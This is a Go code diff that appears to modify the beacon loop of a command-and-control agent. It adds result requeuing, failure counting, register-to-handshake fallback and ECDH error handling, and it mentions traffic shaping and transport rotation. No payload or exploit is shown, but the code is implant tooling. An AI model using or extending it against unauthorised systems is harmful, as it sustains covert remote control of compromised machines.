@@ -4,10 +4,36 @@ import (
 	"encoding/json"
 	"fmt"
 	"log"
+	"net/http"
 	"strconv"
 	"strings"
 	"time"
 )
+
+// requeuePendingBeacon puts results/acks that did not reach the server back in
+// front of the queue. Results carry a stable ResultID, so the server's
+// idempotency cache tolerates a duplicate if the request was processed but the
+// reply was lost.
+func requeuePendingBeacon(results []TaskResult, acks []uint) {
+	if len(results) == 0 && len(acks) == 0 {
+		return
+	}
+	pendingMu.Lock()
+	pendingResults = append(results, pendingResults...)
+	pendingTaskAcks = append(acks, pendingTaskAcks...)
+	reenforcePendingBounds()
+	pendingMu.Unlock()
+}
+
+// noteBeaconFailure increments the backoff counter and returns unsent results
+// to the queue. resultsInFrame is false for auth frames, whose results were
+// already restored before transmission.
+func noteBeaconFailure(resultsInFrame bool, results []TaskResult, acks []uint) {
+	if resultsInFrame {
+		requeuePendingBeacon(results, acks)
+	}
+	beaconConsecutiveFailures++
+}
 
 // doBeaconSafe wraps doBeacon with panic recovery so an unexpected panic in
 // any handler or transport path cannot kill the beacon loop (A-H2).
@@ -119,13 +145,18 @@ func doBeacon() {
 		if Debug {
 			fmt.Printf("[!] Beacon encryption failed, dropping beacon (no plaintext fallback)\n")
 		}
-		pendingMu.Lock()
-		pendingResults = append(resultsCopy, pendingResults...)
-		pendingTaskAcks = append(acksCopy, pendingTaskAcks...)
-		reenforcePendingBounds()
-		pendingMu.Unlock()
+		requeuePendingBeacon(resultsCopy, acksCopy)
 		beaconConsecutiveFailures++
 		return
+	}
+
+	// Registration and handshake frames deliberately carry no task payload.
+	// Put those results back now so the next encrypted frame can deliver them;
+	// only an encrypted frame may lose (and therefore need to requeue) results
+	// on a transport or response failure.
+	resultsInFrame := frameKind == agentFrameEncrypted
+	if !resultsInFrame {
+		requeuePendingBeacon(resultsCopy, acksCopy)
 	}
 
 	// Apply traffic shape analysis and adaptation
@@ -197,11 +228,24 @@ func doBeacon() {
 		maybeRotateTransport()
 	}
 	if respBody == nil {
-		pendingMu.Lock()
-		pendingResults = append(resultsCopy, pendingResults...)
-		pendingTaskAcks = append(acksCopy, pendingTaskAcks...)
-		reenforcePendingBounds()
-		pendingMu.Unlock()
+		if resultsInFrame {
+			requeuePendingBeacon(resultsCopy, acksCopy)
+		}
+		// A 400 on a register frame usually means the server already has this
+		// agent (for example after the local registered marker was lost).
+		// Switch to the keyed handshake path on the next beacon instead of
+		// replaying register forever. The 400 handler already invalidated the
+		// ECDH session.
+		if frameKind == agentFrameRegister && lastHTTPStatus.Load() == int32(http.StatusBadRequest) {
+			seqMu.Lock()
+			registered = true
+			seqMu.Unlock()
+			persistBeaconState()
+			inFastMode.Store(true)
+			if Debug {
+				fmt.Println("[!] Register rejected with 400; retrying as an authenticated handshake")
+			}
+		}
 		// If the server never saw the frame (transport failure) our persisted
 		// sequence may need to move forward. Advance by a small bounded step
 		// (never the old +1000, which could itself exceed the replay-jump cap
@@ -216,8 +260,6 @@ func doBeacon() {
 		}
 		return
 	}
-
-	beaconConsecutiveFailures = 0
 
 	// Parse response. The frame type determines the expected response shape:
 	// auth frames get a plaintext envelope, encrypted frames get {"c": ...}.
@@ -237,15 +279,12 @@ func doBeacon() {
 			if Debug {
 				log.Printf("[!] Failed to parse auth response: %v", err)
 			}
-			// Server rejected the frame (e.g. already registered): fall back to
-			// the handshake path which works for any registered agent.
-			if frameKind == agentFrameRegister {
-				seqMu.Lock()
-				registered = true
-				seqMu.Unlock()
-				persistBeaconState()
-				inFastMode.Store(true)
-			}
+			// A 200 with a body that is not the expected auth envelope is not
+			// a successful registration. Never set the registered marker here:
+			// the old fallback did that for any HTML/proxy response and then
+			// persisted the lie across restarts.
+			noteBeaconFailure(resultsInFrame, resultsCopy, acksCopy)
+			inFastMode.Store(true)
 			return
 		}
 		// Authenticate the server's public key before trusting it.
@@ -253,6 +292,7 @@ func doBeacon() {
 			if Debug {
 				log.Printf("[!] Auth response MAC mismatch, aborting")
 			}
+			noteBeaconFailure(resultsInFrame, resultsCopy, acksCopy)
 			return
 		}
 		if authResp.Reregister {
@@ -263,6 +303,7 @@ func doBeacon() {
 			registered = false
 			seqMu.Unlock()
 			persistBeaconState()
+			beaconConsecutiveFailures = 0
 			inFastMode.Store(true)
 			return
 		}
@@ -285,6 +326,8 @@ func doBeacon() {
 			if Debug {
 				log.Printf("[!] ECDH handshake completion failed: %v", sessErr)
 			}
+			noteBeaconFailure(resultsInFrame, resultsCopy, acksCopy)
+			inFastMode.Store(true)
 			return
 		}
 		if authResp.RegOK {
@@ -296,6 +339,7 @@ func doBeacon() {
 		seqMu.Lock()
 		rekeyRequested = false
 		seqMu.Unlock()
+		beaconConsecutiveFailures = 0
 		// Re-beacon immediately with the encrypted payload.
 		inFastMode.Store(true)
 		return
@@ -304,6 +348,8 @@ func doBeacon() {
 			CipherB64 string `json:"c"`
 		}
 		if err := json.Unmarshal(respBody, &env); err != nil {
+			noteBeaconFailure(resultsInFrame, resultsCopy, acksCopy)
+			inFastMode.Store(true)
 			return
 		}
 		if env.CipherB64 == "" {
@@ -313,6 +359,7 @@ func doBeacon() {
 			if ecdhSess != nil {
 				ecdhSess.invalidate()
 			}
+			noteBeaconFailure(resultsInFrame, resultsCopy, acksCopy)
 			inFastMode.Store(true)
 			return
 		}
@@ -325,12 +372,20 @@ func doBeacon() {
 				log.Printf("[!] ECDH decrypt failed: %v", err)
 			}
 			ecdhSess.invalidate()
+			noteBeaconFailure(resultsInFrame, resultsCopy, acksCopy)
 			inFastMode.Store(true)
 			return
 		}
 		if err := decodeBeacon(plaintext, &resp); err != nil {
+			if Debug {
+				log.Printf("[!] Failed to decode beacon response: %v", err)
+			}
+			ecdhSess.invalidate()
+			noteBeaconFailure(resultsInFrame, resultsCopy, acksCopy)
+			inFastMode.Store(true)
 			return
 		}
+		beaconConsecutiveFailures = 0
 		// Fast-forward if the server is ahead of us (guards against a desync
 		// where our persisted sequence drifted behind the server's last_seq).
 		if resp.LastSeq > 0 {
@@ -347,6 +402,7 @@ func doBeacon() {
 			ecdhSess.invalidate()
 		}
 	default:
+		noteBeaconFailure(resultsInFrame, resultsCopy, acksCopy)
 		return
 	}
 
